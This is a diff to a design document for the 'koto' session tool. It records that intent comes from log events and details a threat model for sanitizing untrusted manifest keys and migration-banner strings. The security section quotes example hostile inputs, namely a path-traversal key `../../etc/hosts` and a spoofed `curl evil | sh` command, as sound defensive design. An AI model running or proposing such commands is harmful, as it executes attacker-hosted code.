@@ -69,14 +69,32 @@ state-file mtime"; and the cross-validation's "Decision 2's off-tick loader"
 now reads "Decision 2's lazy, mtime-guarded loader on the existing tick". Moving
 the snapshot off the UI loop is tracked in koto#337.
 
+**Correction (2026-10-11), intent comes from events.** Two passages placed
+the session's intent in the state-log header. `koto init --intent` and
+`koto session update --intent` record it only as `intent_updated` events and
+leave the header field empty, so a view reading the header showed no intent;
+the fix reads the last such event, with the header as fallback, through one
+rule every surface shares (`engine::types::effective_intent`). With the
+maintainers' approval: the problem statement's "The state log holds the header
+(identity, intent, `execution_dir`, `origin{anchor, store}`) and the events the
+current state is derived from" now reads "The state log holds the header
+(identity, `execution_dir`, `origin{anchor, store}`) and the events the current
+state and the intent are derived from"; and the security section's "`intent`,
+`template_name`, `execution_dir`, `origin.anchor` and `origin.store` come from
+the state-log header" now reads "`intent` (from the log's `intent_updated`
+events, with the header as fallback), `template_name`, `execution_dir`,
+`origin.anchor` and `origin.store` come from the state log". The security
+conclusion is unchanged: every one of these values is untrusted and sanitized
+before it is shown.
+
 ## Context and Problem Statement
 
 A session's working state is spread across stores the shipped surfaces never
 join up for a reader. The context store holds every key's bytes, with a
 manifest (`ctx/manifest.json`) that already records each key's size, SHA-256,
-writer and creation time. The state log holds the header (identity, intent,
-`execution_dir`, `origin{anchor, store}`) and the events the current state is
-derived from. The compiled template holds the directive text `handle_status`
+writer and creation time. The state log holds the header (identity,
+`execution_dir`, `origin{anchor, store}`) and the events the current state
+and the intent are derived from. The compiled template holds the directive text `handle_status`
 interpolates. The dashboard (`src/cli/dashboard*.rs`) renders a multi-session
 list and a per-session detail pane (Summary, History, Remaining) from state
 files it reads by path, never touching the context store; its one-shot mode
@@ -483,7 +501,7 @@ The design closes this with one shared sanitizer in `session_view.rs`, applied t
 
 Binary values are never excerpted, which removes the largest class of terminal-hostile content. The classification samples `min(size, EXCERPT_BOUND)` bytes, so a file that is text for 4096 bytes and hostile after that is shown as text, and the excerpt stops at the bound anyway. The reported size, however, comes from the manifest, and the sample comes from the file; the classifier must use the number of bytes actually read, not the manifest's claim, and the rendering says "recorded" for the hash and size it takes from the manifest.
 
-**Key names and facts fields.** Key names are not trustworthy even though the store validates them on write. `LocalBackend::list_keys` returns the manifest's keys without calling `validate_context_key`; `meta` and `get` do call it. On a cloud session `remote_list_keys` merges the remote manifest's keys the same way, with no validation. A hostile manifest can therefore put a key such as `../../etc/hosts`, a name with ESC in it, or a 10 MB string into the list. The snapshot validates each key with `validate_context_key` as it lists. A key that fails is still shown, so the listing stays complete (R2), but as an entry with a sanitized, length-capped name (256 characters, with a marker when cut), the state `invalid-name`, the manifest's recorded size, and no read attempted. Key names that do pass validation contain only `[A-Za-z0-9._/-]`, so they need no escaping, but the sanitizer runs on them regardless: the cost is nothing and the invariant becomes "no manifest string reaches output unsanitized". The same holds for the facts: `intent`, `template_name`, `execution_dir`, `origin.anchor` and `origin.store` come from the state-log header, which a pulled session file takes from the bucket. They go through the sanitizer and a length cap before the TUI draws them or the JSON carries them. `intent` is free text from whoever started the session and is already shown by the dashboard; the Session tab adds no new reader for it, but it is capped here.
+**Key names and facts fields.** Key names are not trustworthy even though the store validates them on write. `LocalBackend::list_keys` returns the manifest's keys without calling `validate_context_key`; `meta` and `get` do call it. On a cloud session `remote_list_keys` merges the remote manifest's keys the same way, with no validation. A hostile manifest can therefore put a key such as `../../etc/hosts`, a name with ESC in it, or a 10 MB string into the list. The snapshot validates each key with `validate_context_key` as it lists. A key that fails is still shown, so the listing stays complete (R2), but as an entry with a sanitized, length-capped name (256 characters, with a marker when cut), the state `invalid-name`, the manifest's recorded size, and no read attempted. Key names that do pass validation contain only `[A-Za-z0-9._/-]`, so they need no escaping, but the sanitizer runs on them regardless: the cost is nothing and the invariant becomes "no manifest string reaches output unsanitized". The same holds for the facts: `intent` (from the log's `intent_updated` events, with the header as fallback), `template_name`, `execution_dir`, `origin.anchor` and `origin.store` come from the state log, which a pulled session file takes from the bucket. They go through the sanitizer and a length cap before the TUI draws them or the JSON carries them. `intent` is free text from whoever started the session and is already shown by the dashboard; the Session tab adds no new reader for it, but it is capped here.
 
 **Bucket-sourced strings in the migration banner.** The migration design says marker fields reach output only inside JSON-encoded strings. That holds for `koto session` output and for `--detail`, where the `migrated {target, workspace}` object is JSON. The Session tab is a new surface that draws those strings as plain text in a banner, so the JSON guarantee does not transfer. `marker_target_field` in `src/session/cloud.rs` reads `target.session` and `target.workspace` with `as_str()` and no validation, no length bound and no character restriction, so a marker writer controls their content completely. Two things follow. First, the banner is a spoofing surface: a marker can name a "successor" with a name like `ok -- run: curl evil | sh` or a workspace path styled to look like a trusted one, and a person reading the banner may act on it. Second, a long or control-laden string can wreck the layout. The design handles both. The banner runs the values through the sanitizer, additionally escapes `"` and `\` (the sanitizer's set does not include the quote, and an embedded quote could otherwise forge the fixed wording), caps each at 128 characters with a cut marker, and renders them as quoted values after a fixed label ("migrated to session "..." in workspace "...""), never as an imperative sentence or a suggested command. It does not hyperlink, resolve or open either string, and neither is passed to any path or command; the view never follows the successor. For the same reason it tells the reader nothing about whether the target exists or can be trusted. A forged marker already lets a bucket writer make a session refuse (the migration design accepts this as denial of service by someone who could delete the session), and the view adds only the misleading-text risk, which the quoting and caps contain. A marker that cannot be parsed reads as `unknown` for both fields today and the banner shows that as-is.
 
